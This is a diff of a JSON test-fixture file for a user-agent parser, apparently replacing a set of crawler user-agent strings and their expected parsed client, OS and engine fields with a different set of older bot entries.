-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "scrape_central",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Nxploited NF-FU Scanner/3.0.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Nxploited NF-FU Scanner",
+      "name": "Gaisbot",
       "modus": null,
       "version": "3.0.0",
       "manufacturer": "unknown",
@@ -1486,7 +901,7 @@
   },
   {
     "headers": {
-      "user-agent": "JaviWOS-ColdMailBot/1.0 (+https://www.javiwos.de)"
+      "user-agent": "Mozilla/5.0 (compatible; SimpleScraper)"
     },
     "device": {
       "architecture": "",
@@ -1508,7 +923,97 @@
       "bits": 0
     },
     "client": {
-      "name": "JaviWOS-ColdMailBot",
+      "name": "SimpleScraper",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "tigerbot"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "TigerBot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; isa/1.0; +http://intelligentsearchassistant.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "intelligent search assistant",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -1531,7 +1036,7 @@
   },
   {
     "headers": {
-      "user-agent": "PewPewSearchBot/1.0 (+https://github.com/Sidler1/PewPewSearch)"
+      "user-agent": "KOCMOHABT (+https://kozmonavt.tk/) Mozilla/5.0 (compatible; Web Explorer 2)"
     },
     "device": {
       "architecture": "",
@@ -1553,7 +1058,52 @@
       "bits": 0
     },
     "client": {
-      "name": "PewPewSearchBot",
+      "name": "Kozmonavt",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "aipbot/1.0 (aipbot; http://www.aipbot.com; aipbot@aipbot.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "aipbot",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -1576,7 +1126,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; LyonlBot/1.0; +https://lyonl.com/bot.html)"
+      "user-agent": "Mozilla/5.0 (compatible; DownloadBot/5.1; +http://freedlf.com/)"
     },
     "device": {
       "architecture": "",
@@ -1598,7 +1148,52 @@
       "bits": 0
     },
     "client": {
-      "name": "LyonlBot",
+      "name": "AdBot",
+      "modus": null,
+      "version": "5.1.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "OutclicksBot/1 +https://www.outclicks.net/agent/h2sju5"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "OutclicksBot",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -1621,7 +1216,7 @@
   },
   {
     "headers": {
-      "user-agent": "shopware-research-bot/1.0"
+      "user-agent": "Mozilla/4.0 (compatible; DepSpid/5.07;  http://about.depspid.net)"
     },
     "device": {
       "architecture": "",
@@ -1643,7 +1238,142 @@
       "bits": 0
     },
     "client": {
-      "name": "shopware-research-bot",
+      "name": "DepSpid",
+      "modus": null,
+      "version": "5.07.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/3.04 (compatible;QNX Voyager 2.03B ;Photon)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Photon",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": "QNX",
+      "marketingName": "QNX",
+      "version": null,
+      "manufacturer": "blackberry",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "LinksManager.com (http://linksmanager.com/linkchecker.html)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "LinksManager",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": "Text",
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Isara/Isara-1.0 (A non-profit search engine for the benefit of charity.; http://www.isara.org; search@isara.org)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Isara-Search",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -1666,7 +1396,7 @@
   },
   {
     "headers": {
-      "user-agent": "PipericBot/1.0 (+https://piperic.com/bot)"
+      "user-agent": "EmailWolf 1.00"
     },
     "device": {
       "architecture": "",
@@ -1688,7 +1418,52 @@
       "bits": 0
     },
     "client": {
-      "name": "PipericBot",
+      "name": "EmailWolf",
+      "modus": null,
+      "version": "1.00.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Drecombot/1.0 (http://career.drecom.jp/bot.html)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "EcomBot",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -1711,7 +1486,7 @@
   },
   {
     "headers": {
-      "user-agent": "aeverly/0.1 (+https://example.com/bot)"
+      "user-agent": "Download Demon/3.5.0.11"
     },
     "device": {
       "architecture": "",
@@ -1733,9 +1508,9 @@
       "bits": 0
     },
     "client": {
-      "name": "aeverly",
+      "name": "Download Demon",
       "modus": null,
-      "version": "0.1.0",
+      "version": "3.5.0.11",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -1756,7 +1531,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; ads-txt/1.0)"
+      "user-agent": "Mozilla/5.0 (superbot.com;  http://www.super.info)"
     },
     "device": {
       "architecture": "",
@@ -1778,9 +1553,9 @@
       "bits": 0
     },
     "client": {
-      "name": "ads-txt",
+      "name": "SuperBot",
       "modus": null,
-      "version": "1.0.0",
+      "version": null,
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -1801,7 +1576,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; EveryLawyer-DomainFinder/0.1; +research)"
+      "user-agent": "Mozilla/5.0 (compatible; Tagoobot/3.0;  http://www.tagoo.ru)"
     },
     "device": {
       "architecture": "",
@@ -1823,9 +1598,9 @@
       "bits": 0
     },
     "client": {
-      "name": "EveryLawyer-DomainFinder",
+      "name": "Tagoobot",
       "modus": null,
-      "version": "0.1.0",
+      "version": "3.0.0",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -1846,7 +1621,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; URLAliveChecker/1.0)"
+      "user-agent": "Mozilla/5.0 (compatible; Supendobot/0.2;  http://www.supendo.com/bot.html"
     },
     "device": {
       "architecture": "",
@@ -1868,9 +1643,9 @@
       "bits": 0
     },
     "client": {
-      "name": "URLAliveChecker",
+      "name": "Supendobot",
       "modus": null,
-      "version": "1.0.0",
+      "version": "0.2.0",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -1891,7 +1666,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; ePassage24-WebsiteFinder/1.0)"
+      "user-agent": "Mozilla/5.0 (compatible; SpurlBot/0.3)"
     },
     "device": {
       "architecture": "",
@@ -1913,9 +1688,9 @@
       "bits": 0
     },
     "client": {
-      "name": "ePassage24-WebsiteFinder",
+      "name": "SpurlBot",
       "modus": null,
-      "version": "1.0.0",
+      "version": "0.3.0",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -1936,7 +1711,7 @@
   },
   {
     "headers": {
-      "user-agent": "Lighthouse-Research/1.0 (research@lighthousedata.com)"
+      "user-agent": "Mozilla/5.0 (compatible; rexyobot/2.12;  http://www.rexyo.com)"
     },
     "device": {
       "architecture": "",
@@ -1958,9 +1733,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Lighthouse-Research",
+      "name": "rexyobot",
       "modus": null,
-      "version": "1.0.0",
+      "version": "2.12.0",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -1981,7 +1756,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; CVE-2026-4020-go-scanner/1.0)"
+      "user-agent": "Mozilla/5.0 (compatible; Quantcastbot/1.0; www.quantcast.com)"
     },
     "device": {
       "architecture": "",
@@ -2003,97 +1778,7 @@
       "bits": 0
     },
     "client": {
-      "name": "CVE-2026-4020-go-scanner",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; relaion5b-source/0.1)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "relaion5b-source",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; VjusLogoPreview/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "VjusLogoPreview",
+      "name": "QuantcastBot",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -2116,7 +1801,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; CosmosDataCompDownloader/1.0)"
+      "user-agent": "Mozilla/5.0 (compatible; OWPBot/0.3; http://www.openwhitepages.com/)"
     },
     "device": {
       "architecture": "",
@@ -2138,7 +1823,142 @@
       "bits": 0
     },
     "client": {
-      "name": "CosmosDataCompDownloader",
+      "name": "OWPBot",
+      "modus": null,
+      "version": "0.3.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; eCrawler +http://www.regios.org)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Generic Bot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": "WebKit",
+      "version": null,
+      "manufacturer": "apple"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; DNS-Digger-Explorer/1.04; +http://www.dnsdigger.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "DNS Digger Explorer",
+      "modus": null,
+      "version": "1.04.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; DKIMRepBot/1.0;  http://www.dkim-reputation.org)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "DKIMRepBot",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -2161,7 +1981,7 @@
   },
   {
     "headers": {
-      "user-agent": "Govini-DQ-Checker/1.0"
+      "user-agent": "Mozilla/5.0 (compatible; ATLBLbot/1.2;  http://www.atlbl.com/en/bot.html)"
     },
     "device": {
       "architecture": "",
@@ -2183,1627 +2003,7 @@
       "bits": 0
     },
     "client": {
-      "name": "Govini-DQ-Checker",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; SocialPushBot/1.0; +https://socialpush.com/bot)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "SocialPushBot",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; CompanyScraper/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "CompanyScraper",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; manma-tech/1.0; +https://manma.cc)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "manma-tech",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 WebCache-mdream-rs/1.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "WebCache-mdream-rs",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; foda-scanner/0.1)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "foda-scanner",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "ExposureScanner/1.0 (internal-security-audit)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ExposureScanner",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; HaveInListEnricher/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "HaveInListEnricher",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Scryer/1.0 (+https://scryer.network/scanning)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Scryer",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "passkey-domain-check/1.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "passkey-domain-check",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; AvenodeRadar/0.1; +https://avenode.com/security)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "AvenodeRadar",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "ctscan-research/0.1 (+startup deal-sourcing; contact: you@example.com)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ctscan-research",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; deadweb-prober/1.0; +https://github.com/Crawlora-org/dead-web-commoncrawl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "deadweb-prober",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
